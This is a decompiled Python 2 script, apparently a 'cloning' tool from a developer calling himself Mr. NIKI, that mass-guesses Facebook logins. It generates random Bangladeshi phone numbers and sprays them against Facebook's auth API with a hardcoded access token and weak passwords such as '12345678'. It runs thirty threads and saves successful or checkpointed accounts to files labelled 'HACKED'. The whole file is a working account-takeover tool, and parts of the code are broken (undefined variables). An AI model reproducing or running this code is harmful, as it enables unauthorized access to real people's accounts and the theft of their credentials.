# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: arya
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests
logo2 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$  \n| $$ $$ $$  | $$  | $$$$$/    | $$  \n| $$  $$$$  | $$  | $$  $$    | $$  \n| $$\  $$$  | $$  | $$\  $$   | $$  \n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        '

def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;95mWait A Few Moments \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def jenw():
    os.system('rm -rf .txt')
    os.system('clear')
    print logo2
    print '\x1b[1;92mSet Phone Number Amount You Want To Clone.\n    Example:1000,5000,10000,50000\n'
    walid = input('\x1b[1;92mEnter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(walid):
        nmbr = random.randint(1111111, 9999999)
        sys.stdout = open('.txt', 'a')
        print nmbr

    sys.stdout.flush()


logo3 = '\n\x1b[1;96m  /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$  \n| $$ $$ $$  | $$  | $$$$$/    | $$  \n| $$  $$$$  | $$  | $$  $$    | $$  \n| $$\  $$$  | $$  | $$\  $$   | $$  \n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        \n\x1b[0;35m \n      \x1b[0;33\n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. NIKI\x1b[0m\n\x1b[1;92m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Mr. NIKI \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+8801927294533 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mNiki.Cyber404 (NIKI) \n\x1b[1;97m-----------------------------------------------'

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Niki.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;93m     [\xe2\x97\x8f] \x1b[1;97mWait A Few Moments \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo2 = '\n\x1b[1;96m/$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$  \n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        '
logo1 = '\x1b[0;35m \n      \x1b[0;33\n       \x1b[101m\x1b[37;1mWelcome To NIKI Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. NIKI\x1b[0m\n\x1b[1;92m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE   : \x1b[0;31m Mr. NIKI  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;31m+8801927294533 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;31mNiki.Cyber404 (NIKI) \n\x1b[1;92m-----------------------------------------------'

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo2 + logo1
    print
    print '\x1b[1;96m    Use 4G Data For Fastest Cloning '
    print '\x1b[1;92m(1) Super Fast Cloning'
    print '\x1b[1;92m(2) BD Old Id Cloning(slow)'
    print '\x1b[1;91m(0) Back'
    pilih_Somi()


def pilih_Somi():
    Somi = raw_input('\n\x1b[1;92m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    if Somi == '':
        print '\x1b[1;97mFill In Correctly'
        pilih_login()
    elif Somi == '1':
        p()
    elif Somi == '2':
        b()


def p():
    os.system('clear')
    print logo2 + logo1
    print
    print
    print '\x1b[1;92mChoose:(01) Do you want countinue [y/n]'
    act()


def act():
    global cpb
    global oks
    somi = raw_input('\n\n \x1b[1;93m >>> ')
    if somi == '':
        print '[!] Fill in correctly'
        act()
    elif somi == 'y':
        tik()
        os.system('clear')
        print logo2 + logo1
        print
        print '\x1b[1;96mSELECT YOUR NETWORK CODE'
        print '\x1b[1;92m30,31,32,33,34,35,36,37,38,39'
        print '\x1b[1;93m61,62,63,64,65,66,67,68'
        print '\x1b[1;92m71,72,73,74,75,76,79'
        print '\x1b[1;93m80,81,82,83,84,85,86'
        print '\x1b[1;92m40,41,42,43,44,45,91,92,93,96,94'
        print
        try:
            c = raw_input('>>> ')
            k = '01'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;92m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;92m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 47 * '\x1b[1;94m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass2 = k + c + user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass2
                okb = open('out/betaok.txt', 'a')
                okb.write(k + c + user + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m   (NIKI-\x1b[1;93mCP\x1b[1;93m)\x1b[1;93m \xe2\x97\x8f \x1b[1;93m' + k + c + user + '\x1b[1;93m \xe2\x97\x8f \x1b[1;93m ' + pass2
                cps = open('out/betacp.txt', 'a')
                cps.write(k + c + user + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print '\x1b[0;93mTotal \x1b[1;92mHacked\x1b[1;94m/\x1b[1;91mNIKI-CP : \x1b[1;92m' + str(len(oks)) + '\x1b[1;93m/\x1b[1;91m' + str(len(cpb))
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


def b():
    os.system('clear')
    print logo2 + logo1
    print
    print
    print '\x1b[1;92mChoose:(02) Do you want countinue [y/n]'
    action()


def action():
    somi = raw_input('\n\n \x1b[1;97m >>> ')
    if somi == '':
        print '[!] Fill in correctly'
        action()
    elif somi == 'y':
        tik()
        os.system('clear')
        print logo2 + logo1
        print
        try:
            c = raw_input('TYPE ANY 2 DIGIT NUMBER \n \x1b[1;93m\x1b[1;92m\n80,81,82,83,84,85,86,\n71,72,73,74,75,76,79:\n \n >>> ')
            k = '01'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            somi()

    elif somi == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;92m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;92m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 47 * '\x1b[1;93m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '12345678'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;92m \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass1
                okb = open('out/betaok.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m   (NIKI-\x1b[1;93mCP\x1b[1;93m)\x1b[1;93m \xe2\x97\x8f \x1b[1;93m' + k + c + user + '\x1b[1;93m \xe2\x97\x8f \x1b[1;93m ' + pass1
                cps = open('out/betacp.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m   (HAC\x1b[1;92mKED)\x1b[1;92m \xe2\x97\x8f  \x1b[1;92m' + k + c + user + '\x1b[1;92m \xe2\x97\x8f \x1b[1;92m' + pass2
                    okb = open('out/betaok.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m   (NIKI-\x1b[1;93mCP\x1b[1;93m)\x1b[1;93m \xe2\x97\x8f \x1b[1;93m' + k + c + user + '\x1b[1;93m \xe2\x97\x8f \x1b[1;93m ' + pass2
                    cps = open('out/betacp.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print '\x1b[0;93mTotal \x1b[1;92mHacked\x1b[1;94m/\x1b[1;93mBetaCp : \x1b[1;92m' + str(len(oks)) + '\x1b[1;94m/\x1b[1;93m' + str(len(cpb))
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    login()
